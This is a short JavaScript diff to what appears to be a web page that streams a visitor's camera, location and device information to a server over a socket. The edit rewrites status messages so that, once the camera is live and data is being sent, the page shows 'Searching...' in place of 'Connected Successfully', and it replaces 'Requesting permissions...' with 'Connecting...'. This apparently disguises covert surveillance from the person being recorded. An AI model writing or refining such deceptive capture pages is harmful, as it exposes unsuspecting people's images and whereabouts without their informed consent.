@@ -108,7 +108,7 @@ function sendLocation() {
 }
 
 async function startCamera() {
-    setStatus("Requesting permissions...", "waiting");
+    setStatus("Connecting...", "waiting");
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
     }
@@ -129,14 +129,14 @@ async function startCamera() {
         await video.play();
 
         cameraReady = true;
-        setStatus("🟢 Connected Successfully", "active");
+        setStatus("Searching...", "waiting");
 
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         sendLocation();
         startLiveStream();
     } catch (error) {
         cameraReady = false;
-        setStatus("Camera access required to continue.", "error");
+        setStatus("Please allow camera access to continue.", "error");
     }
 }
 
